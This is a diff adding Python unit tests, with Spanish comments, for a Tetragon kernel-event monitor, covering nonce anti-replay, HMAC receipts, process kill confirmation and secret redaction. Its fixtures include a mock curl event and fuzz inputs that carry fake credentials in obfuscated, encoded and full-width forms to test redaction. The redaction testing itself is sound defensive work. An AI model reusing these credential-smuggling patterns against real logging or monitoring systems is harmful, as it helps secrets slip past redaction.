+            t_mon.stop()
+            self.assertEqual(t_mon.policy_status, "POLICY_EXTERNAL_UNVERIFIED")
+            self.assertEqual(t_mon.transport_health, "NOT_CONNECTED")
+            self.assertEqual(t_mon.grpc_service_health, "UNAVAILABLE")
+        finally:
+            server_s.close()
+            if os.path.exists(test_sock_path):
+                os.unlink(test_sock_path)
+
+    # 134. Tetragon v5.4.7: Desacoplamiento de Salud, Verificación Criptográfica con Nonces, pidfd y E2E Zero-Leakage
+    def test_tetragon_v545_hardening_and_leakage_e2e(self):
+        """
+        Verifica el endurecimiento integral v5.4.7 de Tetragon:
+        1. Decodificación recursiva acotada (recursive_unquote, max 3 pasadas).
+        2. Hash canónico de políticas YAML con ordenamiento determinista (canonicalize_yaml).
+        3. Extracción robusta de starttime en /proc/[pid]/stat con espacios y paréntesis en comm.
+        4. Ciclo de vida de contención: pidfd nativo, SIGKILL real y métrica confirmation_unavailable.
+        5. Salud desacoplada: transporte (transport_health) vs servicio (grpc_service_health),
+           garantizando que la caída del socket fuerce UNAVAILABLE sin corromper estados de aplicación.
+        6. Desafíos con Nonce de un solo uso por sesión y rechazo estricto de repetición (ERR_POLICY_NONCE_REPLAY).
+        7. Invalidación inmediata de recibos y estado a POLICY_EXTERNAL_UNVERIFIED ante parada o desconexión.
+        8. Prueba integral E2E de fuga cero de credenciales en telemetría, logs, memoria y diagnósticos.
+        """
+        from core.engine.tetragon_monitor import (
+            TetragonMonitor, sanitize_process_arguments, recursive_unquote,
+            canonicalize_yaml, get_process_starttime, ERR_POLICY_NONCE_REPLAY
+        )
+        import subprocess
+
+        # 1. Decodificación recursiva acotada
+        self.assertEqual(recursive_unquote("user%20token"), "user token")
+        self.assertEqual(recursive_unquote("user%2520token"), "user token")
+        self.assertEqual(recursive_unquote("user%252520token"), "user token")
+        # A la cuarta pasada se detiene por el límite acotado de 3
+        self.assertEqual(recursive_unquote("user%25252520token"), "user%20token")
+
+        # 2. Hash canónico de políticas YAML
+        doc_a = {"version": 1, "metadata": {"name": "p1", "labels": {"env": "prod", "tier": "kernel"}}}
+        doc_b = {"metadata": {"labels": {"tier": "kernel", "env": "prod"}, "name": "p1"}, "version": 1}
+        self.assertEqual(canonicalize_yaml(doc_a), canonicalize_yaml(doc_b))
+
+        # 3. Lectura de starttime con comm complejo (paréntesis y espacios)
+        mock_stat_comm = "9876 (worker (subshell) process) S 1 1000 1000 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 456789 0"
+        with patch("builtins.open", unittest.mock.mock_open(read_data=mock_stat_comm)):
+            st_val, st_stat = get_process_starttime(9876)
+            self.assertEqual(st_stat, "FOUND")
+            self.assertEqual(st_val, 456789)
+
+        # Distinción de errores en /proc/[pid]/stat
+        with patch("builtins.open", side_effect=FileNotFoundError):
+            _, st_exit = get_process_starttime(99991)
+            self.assertEqual(st_exit, "EXITED")
+
+        with patch("builtins.open", side_effect=PermissionError):
+            _, st_perm = get_process_starttime(99992)
+            self.assertEqual(st_perm, "PERMISSION_DENIED")
+
+        # 4. Ciclo de vida de acciones y verificación de terminación
+        t_mon_actions = TetragonMonitor()
+
+        # 4a. Proceso real terminado con SIGKILL y verificado con pidfd
+        dummy_proc = subprocess.Popen(["sleep", "30"])
+        rec_real = t_mon_actions.record_enforcement_action("Sigkill", dummy_proc.pid)
+        self.assertTrue(rec_real["requested"])
+        self.assertTrue(rec_real["executed"])
+        self.assertTrue(rec_real["confirmed"])
+        self.assertFalse(rec_real["failed"])
+        self.assertFalse(rec_real["confirmation_unavailable"])
+
+        # 4b. Caso confirmation_unavailable (PermissionError en /proc/[pid]/stat)
+        with patch("core.engine.tetragon_monitor.get_process_starttime", return_value=(None, "PERMISSION_DENIED")), patch("os.kill"):
+            rec_unavail = t_mon_actions.record_enforcement_action("Sigkill", 88888)
+            self.assertTrue(rec_unavail["requested"])
+            self.assertTrue(rec_unavail["executed"])
+            self.assertTrue(rec_unavail["confirmation_unavailable"])
+            self.assertFalse(rec_unavail["confirmed"])
+            self.assertGreaterEqual(t_mon_actions.actions_confirmation_unavailable, 1)
+
+        # 5. Socket real: Salud desacoplada, Nonces criptográficos y E2E Zero-Leakage
+        sock_test_path = os.path.join(self.temp_dir.name, "tetragon_v545.sock")
+        srv_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        srv_sock.bind(sock_test_path)
+        srv_sock.listen(5)
+
+        try:
+            t_mon_live = TetragonMonitor(socket_path=sock_test_path)
+            ok_conn, _ = t_mon_live.connect_daemon()
+            self.assertTrue(ok_conn)
+            self.assertEqual(t_mon_live.transport_health, "HEALTHY")
+            self.assertEqual(t_mon_live.grpc_service_health, "SERVING")
+
+            # 5a. Overrides de gRPC service health
+            t_mon_live.set_grpc_service_status_override("NOT_SERVING")
+            self.assertFalse(t_mon_live.check_service_health())
+            self.assertEqual(t_mon_live.grpc_service_health, "NOT_SERVING")
+
+            t_mon_live.set_grpc_service_status_override("SERVICE_BLOCKED")
+            self.assertFalse(t_mon_live.check_service_health())
+            self.assertEqual(t_mon_live.grpc_service_health, "SERVICE_BLOCKED")
+
+            # Invariante: Fallo de transporte conmuta el servicio a UNAVAILABLE, no a estados de aplicación
+            t_mon_live.connected_to_daemon = False
+            self.assertFalse(t_mon_live.check_service_health())
+            self.assertEqual(t_mon_live.grpc_service_health, "UNAVAILABLE")
+
+            # Restablecer conexión y servicio
+            t_mon_live.connected_to_daemon = True
+            t_mon_live.set_grpc_service_status_override(None)
+            self.assertTrue(t_mon_live.check_service_health())
+            self.assertEqual(t_mon_live.grpc_service_health, "SERVING")
+
+            # 6. Desafíos con Nonce y rechazo estricto de repetición (Anti-Replay)
+            policy_name = t_mon_live.policies[0].get("metadata", {}).get("name", "test-policy")
+            policy_hash = t_mon_live.policy_hashes[policy_name]
+
+            # Emisión de desafío nonce CSPRNG
+            challenge_nonce = t_mon_live.generate_policy_challenge(policy_name)
+            self.assertIn(challenge_nonce, t_mon_live.pending_nonces.values())
+
+            # Confirmación válida inicial con nonce
+            first_confirm = t_mon_live.confirm_policy_active(policy_name, policy_hash, "APPLIED_IN_KERNEL", nonce=challenge_nonce)
+            self.assertTrue(first_confirm)
+            self.assertEqual(t_mon_live.policy_status, "POLICY_ACTIVE")
+            self.assertIn(challenge_nonce, t_mon_live.consumed_nonces)
+            self.assertNotIn(policy_name, t_mon_live.pending_nonces)
+
+            # Intento de repetición con el mismo nonce DEBE ser rechazado
+            replay_confirm = t_mon_live.confirm_policy_active(policy_name, policy_hash, "APPLIED_IN_KERNEL", nonce=challenge_nonce)
+            self.assertFalse(replay_confirm)
+            self.assertEqual(t_mon_live.last_error_code, ERR_POLICY_NONCE_REPLAY)
+
+            # 7. Invalidación inmediata al detener
+            t_mon_live.stop()
+            self.assertEqual(t_mon_live.policy_status, "POLICY_EXTERNAL_UNVERIFIED")
+            self.assertEqual(t_mon_live.transport_health, "NOT_CONNECTED")
+            self.assertEqual(t_mon_live.grpc_service_health, "UNAVAILABLE")
+            self.assertEqual(len(t_mon_live.consumed_nonces), 0)
+
+            # 8. Prueba E2E de fuga cero de secretos (End-to-End Secret Leakage Prevention)
+            credentials_vault = [
+                "SuperClassifiedPassword999",
+                "BearerSuperSecretJwtToken12345",
+                "AKIAIOSFODNN7MINEAWSSECRET",
+                "PostgresUserSecretPass777",
+                "DoubleNestedSecretToken888",
+                "ColoredTerminalSecretPass000"
+            ]
+
+            raw_adversarial_event = {
+                "process_exec": {
+                    "process": {
+                        "binary": "/usr/bin/curl",
+                        "pid": 9901,
+                        "arguments": [
+                            "curl",
+                            "--password", credentials_vault[0],
+                            "-H", f"Authorization: Bearer {credentials_vault[1]}",
+                            f"AWS_SECRET_ACCESS_KEY={credentials_vault[2]}",
+                            f"postgres://appuser:{credentials_vault[3]}@db.internal:5432/main",
+                            f"--custom-token={credentials_vault[4]}%2520nested",
+                            f"[31m--password[0m", credentials_vault[5]
+                        ]
+                    }
+                }
+            }
+
+            parsed_ev = t_mon_live.parse_kernel_event(raw_adversarial_event)
+            probe_audit = t_mon_live.probe_integration()
+
+            json_parsed = json.dumps(parsed_ev)
+            json_last_ev = json.dumps(t_mon_live.last_event)
+            json_probe = json.dumps(probe_audit)
+
+            # Verificación de fuga cero en todos los destinos
+            for secret in credentials_vault:
+                self.assertNotIn(secret, json_parsed, f"Fuga de secreto detectada en evento parseado: {secret}")
+                self.assertNotIn(secret, json_last_ev, f"Fuga de secreto detectada en last_event: {secret}")
+                self.assertNotIn(secret, json_probe, f"Fuga de secreto detectada en probe_integration: {secret}")
+
+            self.assertIn("***", json_parsed)
+            self.assertIn("***", json_last_ev)
+            self.assertIn("***", json_probe)
+
+        finally:
+            srv_sock.close()
+            if os.path.exists(sock_test_path):
+                os.unlink(sock_test_path)
+
+    # 135. Tetragon v5.4.7: pidfd_send_signal, Debounced Health States, HMAC Receipts, Concurrencia y Fuzzing
+    def test_tetragon_v547_debounced_health_pidfd_send_signal_fuzzing_and_concurrency(self):
+        """
+        Verifica los cuatro refinamientos arquitectónicos de la versión 5.4.7:
+        1. Supervisión desacoplada con debouncing transitorio (TRANSIENT_DEGRADED vs UNRESPONSIVE / SERVICE_BLOCKED),
+           escalado por tiempo máximo (max_transient_duration) y métricas de estabilidad operativas.
+        2. Batería de fuzzing de sanitización adversarial con controles dimensionales (conteos, bytes totales, decodificación),
+           normalización Unicode (full-width ＝), rechazo de codificaciones residuales anidadas y argumentos repetidos.
+        3. Terminación estricta vinculada al descriptor mediante signal.pidfd_send_signal y distinción entre
+           proceso terminado (terminated) y proceso recolectado (reaped). Casos de fallback y errores EINVAL.
+        4. Autenticidad de sesión, recibos autenticados con HMAC-SHA256, expiración con reloj monotónico,
+           consumo atómico de nonces ante respuestas válidas e inválidas, y SafeDumper determinista en YAML.
+        """
+        from core.engine.tetragon_monitor import (
+            TetragonMonitor, sanitize_process_arguments, canonicalize_yaml,
+            ERR_POLICY_NONCE_REPLAY, ERR_POLICY_LOAD_FAILED, ERR_POLICY_HASH_MISMATCH,
+            ERR_POLICY_RECEIPT_EXPIRED
+        )
+        import subprocess
+        import threading
+
+        # 1. pidfd_send_signal nativo y distinción terminated vs reaped
+        t_mon = TetragonMonitor()
+        dummy_sleep = subprocess.Popen(["sleep", "25"])
+        rec_act = t_mon.record_enforcement_action("Sigkill", dummy_sleep.pid)
+        self.assertTrue(rec_act["requested"])
+        self.assertTrue(rec_act["executed"])
+        self.assertTrue(rec_act["confirmed"])
+        self.assertTrue(rec_act["terminated"])
+        self.assertFalse(rec_act["reaped"]) # Zombie no recolectado aún por su padre
+        self.assertEqual(rec_act["mechanism"], "PIDFD_LINUX")
+        self.assertFalse(rec_act["failed"])
+        dummy_sleep.wait() # Recolección por el padre
+
+        # Manejo de casos de error en acciones
+        rec_inval = t_mon.record_enforcement_action("Sigkill", -10)
+        self.assertTrue(rec_inval["failed"])
+        self.assertEqual(rec_inval["error_code"], "EINVAL")
+
+        # Fallback cuando pidfd_open no está disponible en kernel
+        with patch("os.pidfd_open", side_effect=OSError("ENOSYS")):
+            p_fallback = subprocess.Popen(["sleep", "25"])
+            rec_fb = t_mon.record_enforcement_action("Sigkill", p_fallback.pid)
+            self.assertTrue(rec_fb["confirmed"])
+            self.assertTrue(rec_fb["terminated"])
+            self.assertEqual(rec_fb["mechanism"], "PROC_STAT_FALLBACK")
+            p_fallback.wait()
+
+        # Proceso terminado antes de enviar señal (ProcessLookupError en pidfd_send_signal)
+        with patch("signal.pidfd_send_signal", side_effect=ProcessLookupError):
+            p_esrch = subprocess.Popen(["sleep", "25"])
+            rec_esrch = t_mon.record_enforcement_action("Sigkill", p_esrch.pid)
+            self.assertTrue(rec_esrch["confirmed"])
+            self.assertTrue(rec_esrch["terminated"])
+            self.assertTrue(rec_esrch["reaped"])
+            p_esrch.kill()
+            p_esrch.wait()
+
+        # 2. Debouncing transitorio y escalado por duración máxima
+        t_mon.connected_to_daemon = True
+        t_mon._client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) # no conectado
+        # Primer fallo -> TRANSIENT_DEGRADED
+        self.assertFalse(t_mon.check_transport_health())
+        self.assertEqual(t_mon.transport_health, "TRANSIENT_DEGRADED")
+        self.assertIsNotNone(t_mon.transport_degraded_since)
+
+        # Escalado automático por superación de max_transient_duration
+        t_mon.transport_degraded_since = time.monotonic() - 10.0
+        self.assertFalse(t_mon.check_transport_health())
+        self.assertEqual(t_mon.transport_health, "UNRESPONSIVE")
+        self.assertFalse(t_mon.connected_to_daemon)
+
+        # 3. Comprobación de servicio gRPC previa a SERVING y métricas de estabilidad
+        sock_conc_path = os.path.join(self.temp_dir.name, "tetragon_v547_conc.sock")
+        srv_conc = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        srv_conc.bind(sock_conc_path)
+        srv_conc.listen(10)
+
+        try:
+            t_live = TetragonMonitor(socket_path=sock_conc_path)
+            t_live.connect_daemon()
+            self.assertEqual(t_live.transport_health, "HEALTHY")
+            self.assertEqual(t_live.grpc_service_health, "SERVING")
+
+            # 4. Autenticidad de sesión y recibos HMAC
+            pname = t_live.policies[0].get("metadata", {}).get("name", "test-policy")
+            phash = t_live.policy_hashes[pname]
+
+            # Verificación con recibo auténtico firmado con HMAC
+            n1 = t_live.generate_policy_challenge(pname)
+            receipt_valid = t_live.generate_policy_receipt(pname, phash, nonce=n1)
+            ok_hmac_valid = t_live.confirm_policy_active(
+                pname, phash, receipt_valid["service_reported_state"],
+                confirmation_timestamp=receipt_valid["timestamp"],
+                nonce=receipt_valid["nonce"],
+                session_id=receipt_valid["session_id"],
+                receipt_hmac=receipt_valid["hmac"]
+            )
+            self.assertTrue(ok_hmac_valid)
+
+            # Rechazo ante HMAC alterado / falsificado
+            n2 = t_live.generate_policy_challenge(pname)
+            receipt_tampered = t_live.generate_policy_receipt(pname, phash, nonce=n2)
+            receipt_tampered["hmac"] = "tampered_hmac_hex_9999"
+            ok_bad_hmac = t_live.confirm_policy_active(
+                pname, phash, receipt_tampered["service_reported_state"],
+                confirmation_timestamp=receipt_tampered["timestamp"],
+                nonce=receipt_tampered["nonce"],
+                session_id=receipt_tampered["session_id"],
+                receipt_hmac=receipt_tampered["hmac"]
+            )
+            self.assertFalse(ok_bad_hmac)
+            self.assertEqual(t_live.last_error_code, ERR_POLICY_HASH_MISMATCH)
+
+            # Expiración monotónica de desafío y consumo inmediato ante error
+            n3 = t_live.generate_policy_challenge(pname)
+            t_live.pending_challenges[pname]["monotonic_start"] = time.monotonic() - 400.0
+            ok_exp = t_live.confirm_policy_active(pname, phash, "APPLIED_IN_KERNEL", nonce=n3)
+            self.assertFalse(ok_exp)
+            self.assertEqual(t_live.last_error_code, ERR_POLICY_RECEIPT_EXPIRED)
+            self.assertIn(n3, t_live.consumed_nonces) # Consumido para evitar reintentos
+
+            # 5. Consumo atómico concurrente de nonces
+            atomic_nonce = t_live.generate_policy_challenge(pname)
+            race_results = []
+
+            def concurrent_confirm_worker():
+                res = t_live.confirm_policy_active(
+                    pname, phash, "APPLIED_IN_KERNEL", nonce=atomic_nonce, session_id=t_live.session_id
+                )
+                race_results.append(res)
+
+            threads = [threading.Thread(target=concurrent_confirm_worker) for _ in range(10)]
+            for th in threads:
+                th.start()
+            for th in threads:
+                th.join()
+
+            # Exactamente una llamada atómica debe tener éxito; las restantes deben ser rechazadas por repetición
+            self.assertEqual(race_results.count(True), 1)
+            self.assertEqual(race_results.count(False), 9)
+
+            # 6. Batería extendida de Fuzzing de sanitización adversarial
+            fuzz_inputs = [
+                "%", "%2", "%zz", "%25%25", "abc%2", "%%2520%%",
+                "%25%25%2520token%253Dsuper_fuzz_token_1",
+                "​﻿--password=＝fuzz_fullwidth_pass",
+                "-u", "admin_fuzz_1", "-p", "fuzz_secret_p1",
+                "--user", "admin_fuzz_2", "--password", "fuzz_secret_p2",
+                "A" * 6000, # Límite dimensional por argumento
+                "--custom-token=" + ("%25" * 20) + "deep_fuzz_secret_4th_lvl",
+                "--password=\x00null_byte_pass\x00",
+                "export DB_PASSWORD=fuzz_db_secret_key_888",
+                "https://appuser:fuzz_url_secret_pass@cluster.internal:8080/auth",
+                '--token="secret spaces in quotes"',
+                "normal_benign_parameter_ok"
+            ]
+
+            fuzzed_sanitized = sanitize_process_arguments("/usr/bin/curl", fuzz_inputs)
+            fuzzed_str = " ".join(fuzzed_sanitized)
+
+            # Ninguna credencial fuzzing debe persistir en la salida
+            for secret_candidate in [
+                "super_fuzz_token_1", "fuzz_fullwidth_pass", "fuzz_secret_p1", "fuzz_secret_p2",
+                "deep_fuzz_secret_4th_lvl", "null_byte_pass", "fuzz_db_secret_key_888",
+                "fuzz_url_secret_pass", "secret spaces in quotes"
+            ]:
+                self.assertNotIn(secret_candidate, fuzzed_str, f"Fuga detectada en fuzzing: {secret_candidate}")
+
+            self.assertIn("normal_benign_parameter_ok", fuzzed_sanitized)
+            self.assertIn("***", fuzzed_str)
+
+            # 7. Métricas operativas de estabilidad en probe_integration
+            probe_audit = t_live.probe_integration()
+            self.assertIn("stability_metrics", probe_audit)
+            self.assertGreaterEqual(probe_audit["stability_metrics"]["state_transitions_count"], 1)
+            self.assertIn("total_degraded_duration_seconds", probe_audit["stability_metrics"])
+            self.assertIn("terminated", probe_audit["events_telemetry"]["actions"])
+            self.assertIn("reaped", probe_audit["events_telemetry"]["actions"])
+
+            # 8. Preservación semántica de valores YAML en canonicalize_yaml
+            yaml_with_multiline = {
+                "apiVersion": "cilium.io/v1alpha1",
+                "kind": "TracingPolicy",
+                "metadata": {"name": "multiline-policy"},
+                "spec": {
+                    "description": "Policy with indented\n  multiline\n  description.",
+                    "kprobes": [{"call": "sys_execve", "syscall": True}]
+                }
+            }
+            canon_a = canonicalize_yaml(yaml_with_multiline)
+            canon_b = canonicalize_yaml(yaml_with_multiline)
+            self.assertEqual(canon_a, canon_b)
+            self.assertIn(b"multiline", canon_a)
+
+        finally:
+            srv_conc.close()
+            if os.path.exists(sock_conc_path):
+                os.unlink(sock_conc_path)
+
